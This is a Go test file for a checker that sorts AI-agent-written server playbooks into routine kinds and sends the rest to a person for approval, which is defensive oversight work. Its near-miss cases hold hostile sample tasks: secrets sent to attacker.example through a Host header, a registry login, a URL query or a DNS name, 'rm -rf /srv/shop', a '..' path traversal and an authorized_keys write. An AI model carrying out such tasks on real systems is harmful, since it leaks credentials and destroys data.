package actionkinds

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"
)

// explainOutput wraps node tasks, written as mmx explain prints them, in the
// document that mmx explain PLAYBOOK --inventory production --json prints
// (MMX's internal/config/inspect.go).
func explainOutput(tasks ...string) []byte {
	return []byte(`{"schema_version":2,"project":"systems","fleet_stages":[{"path":"fix","selection":"app002","nodes":["app002"],
"source":{"file":"one_time_playbooks/2026-11-03_fix_app002.yml","line":2,"column":5,"field":"fleet_stages[0]"},
"node_tasks":[` + strings.Join(tasks, ",\n") + `]}]}`)
}

// The sample one-offs, one per kind, as the agent writes them in
// one_time_playbooks/.
var sampleOneOffs = []struct {
	name  string
	tasks []string
	kind  Kind
}{
	{"restart caddy once, with a marker file", []string{`{"path":"restart_caddy/task_1","node":"app002","action":"systemd_service","module_kind":"core","status":"ready",
"source":{"file":"one_time_playbooks/2026-11-03_restart_caddy_on_app002.yml","line":5,"column":9,"field":"fleet_stages[0].node_tasks[0]"},
"arguments":[
 {"field":"systemd_service.name","value":"caddy","status":"resolved","source":{"file":"one_time_playbooks/2026-11-03_restart_caddy_on_app002.yml","line":6,"column":17,"field":"fleet_stages[0].node_tasks[0].systemd_service.name"}},
 {"field":"systemd_service.restart_now","value":true,"status":"literal"},
 {"field":"systemd_service.run_only_once_marker_file","value":"/var/lib/mmx/commands_run_once/restart_caddy_on_app002","status":"resolved"},
 {"field":"systemd_service.state","value":"running","status":"literal"}],
"timing":[{"field":"time_limit","value":null,"status":"resolved","source":{"field":"MMX default"}}]}`}, StartOrRestartAService},
	{"start a stopped service", []string{`{"path":"start_worker/task_1","action":"systemd_service","module_kind":"core","status":"ready","arguments":[
 {"field":"systemd_service.in_systemd_of_user_account","value":"shop","status":"resolved"},
 {"field":"systemd_service.name","value":"shop-worker","status":"resolved"},
 {"field":"systemd_service.state","value":"running","status":"literal"}]}`}, StartOrRestartAService},
	{"vacuum the journal to 500MiB", []string{`{"path":"free_disk_space/task_1","node":"app002","action":"systemd_journal_vacuum","module_kind":"core","status":"ready","arguments":[
 {"field":"systemd_journal_vacuum.keep_at_most_size","value":"500MiB","status":"literal"}]}`}, FreeDiskSpace},
	{"delete old compressed nginx logs", []string{`{"path":"free_disk_space/task_1","node":"app002","action":"delete_old_files","module_kind":"core","status":"ready","arguments":[
 {"field":"delete_old_files.directory","value":"/var/log","status":"resolved"},
 {"field":"delete_old_files.include_subdirectories","value":true,"status":"literal"},
 {"field":"delete_old_files.name_patterns","value":["*.gz"],"status":"literal"},
 {"field":"delete_old_files.older_than","value":"7d","status":"literal"}]}`}, FreeDiskSpace},
	{"remove unused images and downloaded packages", []string{
		`{"path":"free_disk_space/task_1","action":"podman_unused_images","module_kind":"core","status":"ready","arguments":[{"field":"podman_unused_images.remove","value":"dangling","status":"literal"}]}`,
		`{"path":"free_disk_space/task_2","action":"docker_unused_images","module_kind":"core","status":"ready"}`,
		`{"path":"free_disk_space/task_3","action":"apt_downloaded_package_files","module_kind":"core","status":"ready","arguments":[{"field":"apt_downloaded_package_files.state","value":"absent","status":"literal"}]}`,
	}, FreeDiskSpace},
	{"pull the shop image again", []string{`{"path":"pull_shop_image/task_1","node":"app002","action":"podman_image","module_kind":"core","status":"ready","arguments":[
 {"field":"podman_image.image","value":"ghcr.io/example/shop:3f2a1c9","status":"resolved"},
 {"field":"podman_image.pull_image","value":"always","status":"literal"}]}`}, PullAContainerImageAgain},
	{"reboot app002", []string{`{"path":"reboot_app002/task_1","node":"app002","action":"reboot","module_kind":"core","status":"ready",
"source":{"file":"one_time_playbooks/2026-11-03_reboot_app002.yml","line":5,"column":9,"field":"fleet_stages[0].node_tasks[0]"}}`}, RebootAServer},
	{"block 203.0.113.0/24", []string{`{"path":"block_scanner/task_1","node":"app002","action":"ufw","module_kind":"core","status":"ready","arguments":[
 {"field":"ufw.incoming_rules","value":[{"action":"deny","protocol":"tcp_and_udp","from":"203.0.113.0/24"}],"status":"literal"},
 {"field":"ufw.incoming_rules[0].from","value":"203.0.113.0/24","status":"resolved"},
 {"field":"ufw.incoming_rules_not_listed","value":"keep","status":"literal"}]}`}, BlockANetworkRange},
	{"reject 198.51.100.0/24 on eth0", []string{`{"path":"block_scanner/task_1","node":"app002","action":"ufw","module_kind":"core","status":"ready","arguments":[
 {"field":"ufw.incoming_rules","value":[{"action":"reject","incoming_interface":"eth0","protocol":"tcp","from":"198.51.100.0/24"}],"status":"literal"},
 {"field":"ufw.incoming_rules_not_listed","value":"keep","status":"literal"},
 {"field":"ufw.state","value":"present","status":"literal"}]}`}, BlockANetworkRange},
	{"point shop.example.com at the new server", []string{`{"path":"move_shop_record/task_1","node":"util01","action":"http","module_kind":"core","status":"ready","arguments":[
 {"field":"http.headers.Authorization","value":null,"reference":"Bearer {{ .secrets.cloudflare_api_token }}","status":"secret"},
 {"field":"http.json_body","value":{"content":"198.51.100.4","name":"shop.example.com","type":"A"},"status":"resolved"},
 {"field":"http.method","value":"PATCH","status":"literal"},
 {"field":"http.url","value":"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records/372e67954025e0ba6aaa6d586b9e0b59","status":"resolved"}]}`}, ChangeDNSRecords},
	{"check caddy", []string{
		`{"path":"check_caddy/check_caddy","node":"app002","action":"role","status":"ready","arguments":[{"field":"inputs.port","value":443,"status":"resolved"}]}`,
		`{"path":"check_caddy/check_caddy/task_1","node":"app002","action":"wait_for","module_kind":"core","status":"ready","arguments":[{"field":"wait_for.tcp_port_accepts_connections","value":443,"status":"literal"}]}`,
		`{"path":"check_caddy/task_3","node":"app002","action":"assert","module_kind":"core","status":"ready","arguments":[{"field":"assert.that","value":null,"reference":{"contains":["{{ .node_tasks.caddyfile.content }}","shop.example.com"]},"status":"condition"}]}`,
		`{"path":"check_caddy/task_4","node":"app002","action":"set_vars","status":"ready","arguments":[{"field":"set_vars.checked","value":true,"status":"resolved"}]}`,
		`{"path":"check_caddy/task_5","node":"app002","action":"show","status":"ready","arguments":[{"field":"show","value":"Caddy answers on port 443.","status":"resolved"}]}`,
		`{"path":"check_caddy/task_6","node":"app002","action":"task_block","status":"ready"}`,
	}, CheckOnly},
	{"start a service without a restart", []string{`{"path":"start_worker/task_1","action":"systemd_service","module_kind":"core","status":"ready","arguments":[
 {"field":"systemd_service.name","value":"shop-worker","status":"resolved"},
 {"field":"systemd_service.restart_now","value":false,"status":"literal"},
 {"field":"systemd_service.state","value":"running","status":"literal"}]}`}, StartOrRestartAService},
	// A login written in the playbook is no secret the agent could not read.
	{"pull the shop image again with a login written in the playbook", []string{`{"path":"pull_shop_image/task_1","node":"app002","action":"podman_image","module_kind":"core","status":"ready","arguments":[
 {"field":"podman_image.image","value":"registry.example.com/shop/web:2.4","status":"resolved"},
 {"field":"podman_image.pull_image","value":"always","status":"literal"},
 {"field":"podman_image.registry_password","value":"public-read","status":"resolved"},
 {"field":"podman_image.registry_username","value":"anonymous","status":"resolved"}]}`}, PullAContainerImageAgain},
	{"wait for the database on db01", []string{`{"path":"wait_for_database/task_1","node":"app002","action":"wait_for","module_kind":"core","status":"ready","arguments":[
 {"field":"wait_for.tcp_host","value":"db01.internal","status":"resolved"},
 {"field":"wait_for.tcp_port_accepts_connections","value":5432,"status":"literal"}]}`}, CheckOnly},
	// Headers written as one value that MMX knows before the run.
	{"point shop.example.com at the new server, with headers MMX knows", []string{`{"path":"move_shop_record/task_1","node":"util01","action":"http","module_kind":"core","status":"ready","arguments":[
 {"field":"http.headers","value":{"Accept":"application/json"},"status":"resolved"},
 {"field":"http.method","value":"GET","status":"literal"},
 {"field":"http.url","value":"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records","status":"resolved"}]}`}, ChangeDNSRecords},
}

func TestSampleOneOffsAreRecognized(t *testing.T) {
	for _, sample := range sampleOneOffs {
		recognition, err := Recognize(explainOutput(sample.tasks...))
		if err != nil || !reflect.DeepEqual(recognition.Kinds, []Kind{sample.kind}) || len(recognition.UnrecognizedTasks) != 0 {
			t.Errorf("%s: %+v %v; want %s", sample.name, recognition, err, sample.kind)
		}
	}
}

// Each near miss looks like a kind but does more, or something the pattern
// cannot check before the run, so it is an unrecognized task, and the
// reason, which the agent and the person who approves read, names the rule
// it breaks. Every condition the agent reads refuses one near miss or more.
func TestNearMissesAreUnrecognizedTasks(t *testing.T) {
	const (
		varLogOnly     = "delete_old_files.directory must be /var/log itself (include_subdirectories: true also selects log directories below /var/log)"
		blocksOnly     = "ufw.incoming_rules must give each rule an action of deny or reject and a from value; only protocol and incoming_interface may also be set, so port and from_inventory_group are not allowed"
		cloudflareOnly = "http.url must be https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records or a path below the zone's dns_records path, with no .. part and no escaped character"
		// The texts below are written out, not read from the table, so a
		// test run before the fix fails on them.
		cloudflareTokenOnly = "http.headers must be known before the run and must not set Host: a Host header asks Cloudflare's servers for another site, which would receive the team's token"
		registryLoginKnown  = "podman_image.image, registry_username, and registry_password must be known before the run, so not a secret: Podman sends the login to the registry that image names, which the playbook chooses"
		waitForHostKnown    = "wait_for.url_responds and tcp_host must be known before the run, so not a secret: the server connects to the host they name, which the playbook chooses"
	)
	serviceArguments := func(argument string) string {
		return "systemd_service." + argument + " is not an allowed argument for Start or restart a service (name, state, restart_now, run_only_once_marker_file, in_systemd_of_user_account)"
	}
	service := func(arguments string) string {
		return `{"path":"fix/task_1","action":"systemd_service","module_kind":"core","status":"ready","arguments":[{"field":"systemd_service.name","value":"caddy","status":"resolved"},` + arguments + `]}`
	}
	deleteOldFiles := func(directory string) string {
		return `{"path":"fix/task_1","action":"delete_old_files","module_kind":"core","status":"ready","arguments":[{"field":"delete_old_files.directory","value":"` + directory + `","status":"resolved"},{"field":"delete_old_files.older_than","value":"7d","status":"literal"}]}`
	}
	firewall := func(rule string) string {
		return `{"path":"fix/task_1","action":"ufw","module_kind":"core","status":"ready","arguments":[{"field":"ufw.incoming_rules","value":[` + rule + `],"status":"literal"},{"field":"ufw.incoming_rules_not_listed","value":"keep","status":"literal"}]}`
	}
	readFile := `{"path":"fix/task_1","action":"read_file","module_kind":"core","status":"ready","arguments":[{"field":"read_file.content_is_secret","value":false,"status":"literal"},{"field":"read_file.path","value":"/etc/shop/env","status":"literal"}]}`
	request := func(address string) string {
		return `{"path":"fix/task_1","action":"http","module_kind":"core","status":"ready","arguments":[{"field":"http.method","value":"POST","status":"literal"},{"field":"http.url","value":"` + address + `","status":"resolved"}]}`
	}
	dnsRecordsRequest := func(headers string) string {
		return `{"path":"fix/task_1","action":"http","module_kind":"core","status":"ready","arguments":[` + headers + `,{"field":"http.method","value":"POST","status":"literal"},{"field":"http.url","value":"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records","status":"resolved"}]}`
	}
	const cloudflareToken = `{"field":"http.headers.Authorization","value":null,"reference":"Bearer {{ .secrets.cloudflare_api_token }}","status":"secret"}`
	pull := func(arguments string) string {
		return `{"path":"fix/task_1","action":"podman_image","module_kind":"core","status":"ready","arguments":[` + arguments + `,{"field":"podman_image.pull_image","value":"always","status":"literal"}]}`
	}
	wait := func(arguments string) string {
		return `{"path":"fix/task_1","action":"wait_for","module_kind":"core","status":"ready","arguments":[` + arguments + `]}`
	}
	var reasons []string
	for _, test := range []struct{ name, task, reason string }{
		{"systemd_service that masks", service(`{"field":"systemd_service.masked","value":false,"status":"literal"},{"field":"systemd_service.state","value":"running","status":"literal"}`), serviceArguments("masked")},
		{"systemd_service that changes start at boot", service(`{"field":"systemd_service.start_at_boot","value":true,"status":"literal"},{"field":"systemd_service.state","value":"running","status":"literal"}`), serviceArguments("start_at_boot")},
		{"read_file, whose content as root could be a secret", readFile, "no kind covers the module read_file"},
		{"systemd_service that stops", service(`{"field":"systemd_service.state","value":"stopped","status":"literal"}`), "systemd_service.state must be running"},
		{"systemd_service that restarts without a marker file", service(`{"field":"systemd_service.restart_now","value":true,"status":"literal"},{"field":"systemd_service.state","value":"running","status":"literal"}`), "systemd_service.restart_now: true requires run_only_once_marker_file"},
		{"systemd_service without a state", service(`{"field":"systemd_service.in_systemd_of_user_account","value":"shop","status":"resolved"}`), "systemd_service.state must be running"},
		{"systemd_service whose restart_now is known only during the run", service(`{"field":"systemd_service.restart_now","value":null,"reference":"{{ .vars.restart }}","status":"runtime"},{"field":"systemd_service.run_only_once_marker_file","value":"/var/lib/mmx/commands_run_once/restart_caddy","status":"resolved"},{"field":"systemd_service.state","value":"running","status":"literal"}`), "systemd_service.restart_now must be true or false"},
		{"systemd_service that restarts with a marker file known only during the run", service(`{"field":"systemd_service.restart_now","value":true,"status":"literal"},{"field":"systemd_service.run_only_once_marker_file","value":null,"reference":"{{ .node_tasks.marker.stdout }}","status":"runtime"},{"field":"systemd_service.state","value":"running","status":"literal"}`), "systemd_service.restart_now: true requires run_only_once_marker_file"},
		{"apt_downloaded_package_files whose state is known only during the run", `{"path":"fix/task_1","action":"apt_downloaded_package_files","module_kind":"core","status":"ready","arguments":[{"field":"apt_downloaded_package_files.state","value":null,"reference":"{{ .vars.state }}","status":"runtime"}]}`, "apt_downloaded_package_files.state must be absent"},
		{"podman_image that pulls only when the image is missing", `{"path":"fix/task_1","action":"podman_image","module_kind":"core","status":"ready","arguments":[{"field":"podman_image.image","value":"ghcr.io/example/shop:3f2a1c9","status":"resolved"},{"field":"podman_image.pull_image","value":"when_missing","status":"literal"}]}`, "podman_image.pull_image must be always"},
		{"ufw that removes the listed rules", `{"path":"fix/task_1","action":"ufw","module_kind":"core","status":"ready","arguments":[{"field":"ufw.incoming_rules","value":[{"action":"deny","from":"203.0.113.0/24","protocol":"tcp_and_udp"}],"status":"literal"},{"field":"ufw.incoming_rules_not_listed","value":"keep","status":"literal"},{"field":"ufw.state","value":"absent","status":"literal"}]}`, "ufw.state must be present or left out"},
		{"ufw rule without a from", firewall(`{"action":"deny","incoming_interface":"eth0","protocol":"tcp_and_udp"}`), blocksOnly},
		{"ufw whose rules are known only during the run", `{"path":"fix/task_1","action":"ufw","module_kind":"core","status":"ready","arguments":[{"field":"ufw.incoming_rules","value":null,"reference":"{{ .vars.blocked }}","status":"runtime"},{"field":"ufw.incoming_rules_not_listed","value":"keep","status":"literal"}]}`, blocksOnly},
		{"delete_old_files in a database's directory", deleteOldFiles("/var/lib/postgresql/16/main"), varLogOnly},
		{"delete_old_files out of /var/log with ..", deleteOldFiles("/var/log/../lib"), varLogOnly},
		{"delete_old_files in a directory named like /var/log", deleteOldFiles("/var/logs"), varLogOnly},
		{"delete_old_files in a directory under /var/log, which could be a mount point", deleteOldFiles("/var/log/nginx"), varLogOnly},
		{"ufw rule with a port", firewall(`{"action":"deny","from":"203.0.113.0/24","port":22,"protocol":"tcp"}`), blocksOnly},
		{"ufw allow rule", firewall(`{"action":"allow","from":"203.0.113.0/24","protocol":"tcp_and_udp"}`), blocksOnly},
		{"ufw rule for an inventory group", firewall(`{"action":"deny","from_inventory_group":{"group":"app_servers","use_node_address":true},"protocol":"tcp_and_udp"}`), blocksOnly},
		{"ufw that removes the rules not listed", `{"path":"fix/task_1","action":"ufw","module_kind":"core","status":"ready","arguments":[{"field":"ufw.incoming_rules","value":[{"action":"deny","from":"203.0.113.0/24","protocol":"tcp_and_udp"}],"status":"literal"},{"field":"ufw.incoming_rules_not_listed","value":"remove","status":"literal"}]}`, "ufw.incoming_rules_not_listed must be keep"},
		{"http to another host", request("https://api.example.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records"), cloudflareOnly},
		{"http to Cloudflare's account members through ..", request("https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records/../../../accounts/01a7362d577a6c3019a474fd6f485823/members"), cloudflareOnly},
		{"http to another Cloudflare API", request("https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/settings/ssl"), cloudflareOnly},
		// MMX's http sends a Host header as the request's host, so Cloudflare's
		// servers would be asked for the agent's site, with the team's token.
		{"http to Cloudflare's address with a Host header for another site", dnsRecordsRequest(cloudflareToken + `,{"field":"http.headers.host","value":"attacker.example","status":"resolved"}`), cloudflareTokenOnly},
		// Headers written as one reference: MMX lists them as one value, known
		// only during the run even when they hold the token, so any header
		// could be in them.
		{"http whose headers, written as one value, set Host", dnsRecordsRequest(`{"field":"http.headers","value":{"Accept":"application/json","HOST":"attacker.example"},"status":"resolved"}`), cloudflareTokenOnly},
		{"http whose headers are one value known only during the run", dnsRecordsRequest(`{"field":"http.headers","value":null,"reference":"{{ .vars.headers }}","status":"runtime"}`), cloudflareTokenOnly},
		// Podman logs in to the registry that image names, which the playbook
		// chooses, so a vault secret in the login would reach that registry.
		{"podman_image whose registry_password is a secret, for a registry the playbook names", pull(`{"field":"podman_image.image","value":"attacker.example/x:1","status":"resolved"},{"field":"podman_image.registry_password","value":null,"reference":"{{ .secrets.ghcr_token }}","status":"secret"},{"field":"podman_image.registry_username","value":"u","status":"resolved"}`), registryLoginKnown},
		{"podman_image whose registry_username is a secret", pull(`{"field":"podman_image.image","value":"attacker.example/x:1","status":"resolved"},{"field":"podman_image.registry_password","value":"p","status":"resolved"},{"field":"podman_image.registry_username","value":null,"reference":"{{ .secrets.ghcr_token }}","status":"secret"}`), registryLoginKnown},
		{"podman_image whose registry_password is known only during the run, such as a set_vars of a secret", pull(`{"field":"podman_image.image","value":"ghcr.io/example/shop:3f2a1c9","status":"resolved"},{"field":"podman_image.registry_password","value":null,"reference":"{{ .vars.token }}","status":"runtime"},{"field":"podman_image.registry_username","value":"u","status":"resolved"}`), registryLoginKnown},
		{"podman_image whose image is known only during the run", pull(`{"field":"podman_image.image","value":null,"reference":"{{ .node_tasks.find_image.stdout }}","status":"runtime"}`), registryLoginKnown},
		// MMX refuses a secret in these during the run too; MMHotline does not
		// rely on that.
		{"wait_for whose url_responds holds a secret", wait(`{"field":"wait_for.url_responds","value":null,"reference":"http://attacker.example/?k={{ .secrets.ghcr_token }}","status":"secret"}`), waitForHostKnown},
		{"wait_for whose tcp_host holds a secret", wait(`{"field":"wait_for.tcp_host","value":null,"reference":"{{ .secrets.ghcr_token }}.attacker.example","status":"secret"},{"field":"wait_for.tcp_port_accepts_connections","value":443,"status":"literal"}`), waitForHostKnown},
		{"wait_for whose tcp_host is known only during the run", wait(`{"field":"wait_for.tcp_host","value":null,"reference":"{{ .vars.host }}","status":"runtime"},{"field":"wait_for.tcp_port_accepts_connections","value":443,"status":"literal"}`), waitForHostKnown},
		{"a project_executable module", `{"path":"fix/task_1","action":"greeting","module_kind":"project_executable","status":"ready","arguments":[{"field":"greeting.path","value":"/tmp/greeting.txt","status":"resolved"}]}`, "no kind covers the module greeting"},
		{"a shell task", `{"path":"fix/task_1","action":"shell","module_kind":"core","status":"ready","arguments":[{"field":"shell.script","value":"journalctl --vacuum-size=500M","status":"literal"}]}`, "no kind covers the module shell"},
		{"an argument the pattern reads, known only during the run", `{"path":"fix/task_1","action":"delete_old_files","module_kind":"core","status":"ready","arguments":[{"field":"delete_old_files.directory","value":null,"reference":"{{ .node_tasks.find_log_directory.stdout }}","status":"runtime"}]}`, varLogOnly},
		{"wait_for with a command", `{"path":"fix/task_1","action":"wait_for","module_kind":"core","status":"ready","arguments":[{"field":"wait_for.command_succeeds","value":"rm -rf /srv/shop","status":"literal"}]}`, "wait_for.command_succeeds is not an allowed argument for Check only (tcp_port_accepts_connections, tcp_port_refuses_connections, tcp_host, path_exists, path_is_missing, url_responds, trusted_certificate_authority_file, dangerously_skip_server_certificate_check, docker_container_is_healthy, docker_compose_project_is_ready, podman_container_is_healthy, podman_container_of_user_account, expected_http_status_codes, response_body_contains, wait_at_most)"},
		{"reboot with a check command", `{"path":"fix/task_1","action":"reboot","module_kind":"core","status":"ready","arguments":[{"field":"reboot.run_only_if_this_command_succeeds","value":"rm -rf /srv/shop","status":"literal"}]}`, "reboot.run_only_if_this_command_succeeds is not an allowed argument for Reboot a server (skip_if_this_path_exists, run_only_if_this_path_exists, wait_at_most)"},
		// For a task under a when, MMX lists only the arguments that can hold a
		// reference; this wait_for's command_succeeds does not show.
		{"wait_for under a when", `{"path":"fix/task_1","action":"wait_for","module_kind":"core","status":"conditional","arguments":[{"field":"when","value":null,"reference":{"equals":["{{ .node.distribution.id }}","debian"]},"status":"condition"}]}`, "MMX knows the task's arguments only during the playbook run (status conditional)"},
		// A module of the team's own, or an official extra module, can do
		// anything, whatever its name.
		{"a project module named like a core module", `{"path":"fix/task_1","action":"systemd_service","module_kind":"project_starlark","status":"ready","arguments":[{"field":"systemd_service.name","value":"caddy","status":"resolved"},{"field":"systemd_service.state","value":"running","status":"literal"}]}`, "systemd_service in this task is a project module; only MMX's core module counts"},
		{"an official extra module named like a core module", `{"path":"fix/task_1","action":"reboot","module_kind":"official_extra","status":"ready"}`, "reboot in this task is an official extra module; only MMX's core module counts"},
		{"a setting of the task other than when and loop", `{"path":"fix/task_1","action":"reboot","module_kind":"core","status":"ready","arguments":[{"field":"retry.until","value":true,"status":"literal"}]}`, "the task's setting retry.until is not accepted by any kind of action; only when and loop go with a module's arguments"},
	} {
		recognition, err := Recognize(explainOutput(test.task))
		if err != nil || !reflect.DeepEqual(recognition.Kinds, []Kind{UnrecognizedTask}) || len(recognition.UnrecognizedTasks) != 1 || recognition.UnrecognizedTasks[0].Path != "fix/task_1" || recognition.UnrecognizedTasks[0].Reason != test.reason {
			t.Errorf("%s: %+v %v\nwant the reason %q", test.name, recognition, err, test.reason)
		}
		reasons = append(reasons, test.reason)
	}
	for _, rule := range patterns {
		for _, condition := range rule.conditions {
			if !slices.Contains(reasons, condition.text) {
				t.Errorf("no near miss of %s breaks its condition %q", rule.module, condition.text)
			}
		}
	}
}

// A playbook's kinds are its tasks' kinds, each once, in the order of
// Kinds(), with the tasks that matched none, and every task in the order mmx
// explain lists them, as the review agent reads them, each with its kind, as
// agent-playbook-rules check-whether-a-playbook-needs-a-person lists them.
func TestPlaybookKindsAreItsTasksKinds(t *testing.T) {
	restart, reboot := sampleOneOffs[0].tasks[0], sampleOneOffs[6].tasks[0]
	shell := `{"path":"fix/task_3","node":"app002","action":"shell","module_kind":"core","status":"ready","arguments":[{"field":"shell.script","value":"echo","status":"literal"}]}`
	recognition, err := Recognize(explainOutput(reboot, restart, shell, restart))
	shellTask := Task{Path: "fix/task_3", Node: "app002", Action: "shell", ModuleKind: "core", Status: "ready", Arguments: []Argument{{Field: "shell.script", Value: "echo", Status: "literal"}}}
	var tasks []string
	for _, task := range recognition.Tasks {
		tasks = append(tasks, task.Path+" "+task.Action+" "+string(task.Kind()))
	}
	if err != nil || !reflect.DeepEqual(recognition.Kinds, []Kind{StartOrRestartAService, RebootAServer, UnrecognizedTask}) || !reflect.DeepEqual(recognition.UnrecognizedTasks, []Unrecognized{{shellTask, "no kind covers the module shell"}}) ||
		!reflect.DeepEqual(tasks, []string{"reboot_app002/task_1 reboot reboot_a_server", "restart_caddy/task_1 systemd_service start_or_restart_a_service", "fix/task_3 shell unrecognized_task", "restart_caddy/task_1 systemd_service start_or_restart_a_service"}) || !reflect.DeepEqual(recognition.Tasks[2], shellTask) {
		t.Fatalf("%+v %v", recognition, err)
	}
}

func TestOutputMMHotlineCannotRead(t *testing.T) {
	for _, test := range []struct{ output, want string }{
		{`mmx: fleet stage fix: unknown module systemd_servise`, "JSON MMHotline cannot read"},
		// Version 1 does not list the files a playbook saves on the
		// controller machine, so MMHotline cannot judge it.
		{`{"schema_version":1,"fleet_stages":[{"path":"fix","node_tasks":[{"path":"fix/task_1","action":"show","status":"ready"}]}]}`, "mmx explain printed schema_version 1, which does not list the files a playbook saves on MMHotline's server; upgrade MMX to 0.1.0 or later, whose mmx explain lists them"},
		{`{"schema_version":3,"fleet_stages":[]}`, "mmx explain printed schema_version 3; MMHotline reads version 2"},
		{`{"schema_version":2,"project":"systems","fleet_stages":[{"path":"fix","selection":"app009","node_tasks":[]}]}`, "no node task"},
	} {
		if _, err := Recognize([]byte(test.output)); err == nil || !strings.Contains(err.Error(), test.want) {
			t.Errorf("%s: %v", test.output, err)
		}
	}
}

func TestEveryKindHasATitle(t *testing.T) {
	for _, kind := range Kinds() {
		if kind.Title() == "" {
			t.Errorf("%s has no title", kind)
		}
	}
}

// With MMHOTLINE_TEST_MMX_PROGRAM naming an mmx program, the routine fixes,
// written as MMX's own modules, are recognized from the real mmx explain
// output; rerun it when MMX changes a module's inputs.
func TestRealMMXRoutineFixesAreRecognized(t *testing.T) {
	program := os.Getenv("MMHOTLINE_TEST_MMX_PROGRAM")
	if program == "" {
		t.Skip("set MMHOTLINE_TEST_MMX_PROGRAM to an mmx program, such as one built with go build -o $TMPDIR/mmx ./cmd/mmx in MMX's repository")
	}
	project := t.TempDir()
	playbook := func(tasks string) string {
		return "fleet_stages:\n  - id: fix\n    nodes: app002\n    node_tasks:\n" + tasks
	}
	files := map[string]string{
		"mmx_project_settings.yml":   "project_name: systems\ndefault_inventory: production\n",
		"inventories/production.yml": "nodes:\n  app002:\n    address: 192.0.2.10\n    ssh_user: root\n",
		"one_time_playbooks/2026-11-03_restart_caddy_on_app002.yml": playbook(`      - systemd_service:
          name: caddy
          state: running
          restart_now: true
          run_only_once_marker_file: /var/lib/mmx_markers/2026-11-03_restart_caddy
`),
		"one_time_playbooks/2026-11-03_free_disk_space_on_app002.yml": playbook(`      - systemd_journal_vacuum:
          keep_at_most_size: 500MiB
      - podman_unused_images:
          remove: dangling_images_only
      - apt_downloaded_package_files:
          state: absent
      - delete_old_files:
          directory: /var/log
          name_patterns: ["*.gz", "*.[0-9]"]
          older_than: 7d
          include_subdirectories: true
`),
		"one_time_playbooks/2026-11-03_delete_old_database_files_on_app002.yml": playbook(`      - delete_old_files:
          directory: /var/log/postgresql
          name_patterns: ["*.gz"]
          older_than: 7d
          include_subdirectories: false
`),
	}
	// Fleet stages that save a file on the controller machine: a show-only one
	// that saves a Git hook, one whose path MMX resolves only during the run,
	// and one that selects no servers, which still writes its file.
	const save = "    save_on_controller_machine:\n      - template: one_time_playbooks/hook.tmpl\n        path: %s\n        permissions_mode: \"0755\"\n"
	files["inventories/production.yml"] += "groups:\n  retired:\n    nodes: []\n"
	files["one_time_playbooks/hook.tmpl"] = "#!/bin/sh\n"
	files["one_time_playbooks/2026-11-03_save_a_git_hook.yml"] = playbook("      - show: Caddy answers again.\n") + fmt.Sprintf(save, ".git/hooks/pre-commit")
	files["one_time_playbooks/2026-11-03_save_where_a_task_says.yml"] = playbook("      - id: check\n        assert:\n          that: true\n") + "    outputs:\n      place: \"{{ .node_tasks.check.status }}\"\n" +
		"  - id: save\n    nodes: app002\n    node_tasks:\n      - show: Saving.\n" + fmt.Sprintf(save, `"saved/{{ .outputs.fix.app002.place }}.txt"`)
	files["one_time_playbooks/2026-11-03_save_from_a_stage_without_servers.yml"] = playbook("      - show: Caddy answers again.\n") +
		"  - id: retired_servers\n    nodes: retired\n    skip_when_no_nodes_are_selected: true\n    node_tasks:\n      - show: Nothing to do.\n" + fmt.Sprintf(save, "/var/lib/mmhotline/.ssh/authorized_keys")
	saved := map[string]string{
		"2026-11-03_save_a_git_hook":                   "/.git/hooks/pre-commit on MMHotline's server, with permissions_mode 0755",
		"2026-11-03_save_where_a_task_says":            "whose names MMX knows only during the run, from the path saved/{{ .outputs.fix.app002.place }}.txt, with permissions_mode 0755",
		"2026-11-03_save_from_a_stage_without_servers": "the fleet stage writes /var/lib/mmhotline/.ssh/authorized_keys on MMHotline's server, with permissions_mode 0755",
	}
	kinds := map[string][]Kind{
		"2026-11-03_restart_caddy_on_app002":             {StartOrRestartAService},
		"2026-11-03_free_disk_space_on_app002":           {FreeDiskSpace},
		"2026-11-03_delete_old_database_files_on_app002": {UnrecognizedTask},
	}
	for name := range saved {
		kinds[name] = []Kind{CheckOnly, UnrecognizedTask}
	}
	// Each example the agent and people read is a task MMX accepts, of its kind.
	for _, rule := range patterns {
		for index, example := range rule.examples {
			name := fmt.Sprintf("2026-11-03_example_%s_%d", rule.module, index+1)
			files["one_time_playbooks/"+name+".yml"] = playbook("      " + strings.ReplaceAll(example, "\n", "\n      ") + "\n")
			kinds[name] = []Kind{rule.kind}
		}
	}
	for path, content := range files {
		if err := os.MkdirAll(filepath.Dir(filepath.Join(project, path)), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(project, path), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for name, want := range kinds {
		command := exec.Command(program, "explain", name, "--inventory", "production", "--json")
		command.Dir = project
		output, err := command.Output()
		if err != nil {
			t.Fatalf("%s: mmx explain: %v", name, err)
		}
		recognition, err := Recognize(output)
		if err != nil || !slices.Equal(recognition.Kinds, want) {
			t.Fatalf("%s: %+v %v\n%s", name, recognition, err, output)
		}
		if reason, ok := saved[name]; ok && (len(recognition.UnrecognizedTasks) != 1 || recognition.UnrecognizedTasks[0].Action != "save_on_controller_machine" || !strings.HasSuffix(recognition.UnrecognizedTasks[0].Reason, reason)) {
			t.Fatalf("%s: %+v\nwant a reason ending %q\n%s", name, recognition.UnrecognizedTasks, reason, output)
		}
	}
}
